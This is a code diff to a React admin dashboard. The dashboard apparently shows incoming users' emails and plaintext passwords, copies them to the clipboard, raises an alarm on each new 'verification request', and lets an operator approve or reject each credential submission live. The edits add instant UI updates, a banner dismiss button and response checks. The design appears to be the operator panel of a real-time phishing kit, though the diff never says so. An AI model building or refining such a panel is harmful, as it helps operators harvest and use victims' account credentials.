@@ -35,7 +35,7 @@ export default function AdminDashboardPage() {
   // Helper for unique submission signature
   const getSubKey = (id: number, pass: string) => `${id}:${pass}`;
   const isAcked = (u: UserData, list: string[] = acknowledgedUsersRef.current) => {
-    return list.includes(getSubKey(u.id, u.password)) || list.includes(String(u.id));
+    return list.includes(getSubKey(u.id, u.password));
   };
 
   useEffect(() => {
@@ -200,7 +200,13 @@ export default function AdminDashboardPage() {
   const loadUsers = async () => {
     try {
       const res = await fetch('/api/get_users?t=' + Date.now());
-      const data: UserData[] = await res.json();
+      if (!res.ok) {
+        return;
+      }
+      const data = await res.json();
+      if (!Array.isArray(data)) {
+        return;
+      }
       setUsers(data);
 
       let shouldRing = false;
@@ -303,7 +309,7 @@ export default function AdminDashboardPage() {
     copyToClipboard(`${email} ${pass}`);
     const key = getSubKey(id, pass);
     if (!acknowledgedUsersRef.current.includes(key)) {
-      const updated = [...acknowledgedUsersRef.current, key, String(id)];
+      const updated = [...acknowledgedUsersRef.current, key];
       acknowledgedUsersRef.current = updated;
       setAcknowledgedUsers(updated);
     }
@@ -316,11 +322,30 @@ export default function AdminDashboardPage() {
       const user = usersRef.current.find((u) => u.id === id);
       const pwd = currentPassword || user?.password || '';
       const key = getSubKey(id, pwd);
+
+      // 1. Mark submission signature as acknowledged
       if (!acknowledgedUsersRef.current.includes(key)) {
-        const updated = [...acknowledgedUsersRef.current, key, String(id)];
+        const updated = [...acknowledgedUsersRef.current, key];
         acknowledgedUsersRef.current = updated;
         setAcknowledgedUsers(updated);
       }
+
+      // 2. Optimistic UI update: instantly move to approved status so popup and queue clear with zero delay
+      setUsers((prev) =>
+        prev.map((u) => (u.id === id ? { ...u, status: 'approved' } : u))
+      );
+
+      // 3. Immediately turn off alarm if no other pending unacknowledged verifications exist
+      const remainingPending = usersRef.current.some(
+        (u) => u.id !== id && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
+      );
+      if (!remainingPending) {
+        manageAlarm(false);
+      }
+
+      showToast(`User #${id} Approved`, 'success');
+
+      // 4. Background DB update
       const formData = new FormData();
       formData.append('user_id', String(id));
       formData.append('status', 'approved');
@@ -329,8 +354,7 @@ export default function AdminDashboardPage() {
         method: 'POST',
         body: formData,
       });
-      manageAlarm(false);
-      showToast(`User #${id} Approved`, 'success');
+
       loadUsers();
     } catch (err) {
       console.error('approveUser error:', err);
@@ -340,18 +364,33 @@ export default function AdminDashboardPage() {
 
   const rejectUser = async (id: number, currentPassword?: string) => {
     try {
-      // Remove any prior acknowledgment so if this user re-submits later, they trigger alerts again
-      const filtered = acknowledgedUsersRef.current.filter((k) => !k.startsWith(`${id}:`) && k !== String(id));
-      acknowledgedUsersRef.current = filtered;
-      setAcknowledgedUsers(filtered);
+      const user = usersRef.current.find((u) => u.id === id);
+      const pwd = currentPassword || user?.password || '';
+      const key = getSubKey(id, pwd);
 
-      // Also allow desktop notification to fire again for any new submission from this user
-      notifiedSubmissionsRef.current.forEach((subKey) => {
-        if (subKey.startsWith(`${id}:`)) {
-          notifiedSubmissionsRef.current.delete(subKey);
-        }
-      });
+      // 1. Mark this specific credential submission as acknowledged so this rejected entry never triggers popup/alarm again
+      if (!acknowledgedUsersRef.current.includes(key)) {
+        const updated = [...acknowledgedUsersRef.current, key];
+        acknowledgedUsersRef.current = updated;
+        setAcknowledgedUsers(updated);
+      }
 
+      // 2. Optimistic UI update: instantly mark as rejected so popup and queue clear immediately
+      setUsers((prev) =>
+        prev.map((u) => (u.id === id ? { ...u, status: 'rejected' } : u))
+      );
+
+      // 3. Immediately turn off alarm if no other pending unacknowledged verifications exist
+      const remainingPending = usersRef.current.some(
+        (u) => u.id !== id && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
+      );
+      if (!remainingPending) {
+        manageAlarm(false);
+      }
+
+      showToast(`User #${id} Rejected`, 'warning');
+
+      // 4. Background DB update
       const formData = new FormData();
       formData.append('user_id', String(id));
       formData.append('status', 'rejected');
@@ -360,8 +399,7 @@ export default function AdminDashboardPage() {
         method: 'POST',
         body: formData,
       });
-      manageAlarm(false);
-      showToast(`User #${id} Rejected`, 'warning');
+
       loadUsers();
     } catch (err) {
       console.error('rejectUser error:', err);
@@ -372,6 +410,8 @@ export default function AdminDashboardPage() {
   const deleteUser = async (id: number) => {
     if (confirm(`Permanently delete entry #${id}?`)) {
       try {
+        // Optimistically remove from state
+        setUsers((prev) => prev.filter((u) => u.id !== id));
         await fetch(`/api/delete_user?id=${id}`);
         showToast(`Log entry #${id} removed`, 'info');
         loadUsers();
@@ -1872,9 +1912,33 @@ export default function AdminDashboardPage() {
               <i className="ri-alarm-warning-fill" style={{ fontSize: '18px' }}></i>
               <span>Incoming Verification Request #{activePopupUser.id}</span>
             </div>
-            <span style={{ fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600 }}>
-              {formatTime(activePopupUser.seconds_ago)}
-            </span>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+              <span style={{ fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600 }}>
+                {formatTime(activePopupUser.seconds_ago)}
+              </span>
+              <button
+                onClick={() => {
+                  const key = getSubKey(activePopupUser.id, activePopupUser.password);
+                  const updated = [...acknowledgedUsersRef.current, key];
+                  acknowledgedUsersRef.current = updated;
+                  setAcknowledgedUsers(updated);
+                  manageAlarm(false);
+                }}
+                style={{
+                  background: 'none',
+                  border: 'none',
+                  color: 'var(--text-secondary)',
+                  cursor: 'pointer',
+                  fontSize: '18px',
+                  display: 'flex',
+                  alignItems: 'center',
+                  padding: '2px',
+                }}
+                title="Dismiss banner"
+              >
+                <i className="ri-close-line"></i>
+              </button>
+            </div>
           </div>
 
           <div className="popup-body">
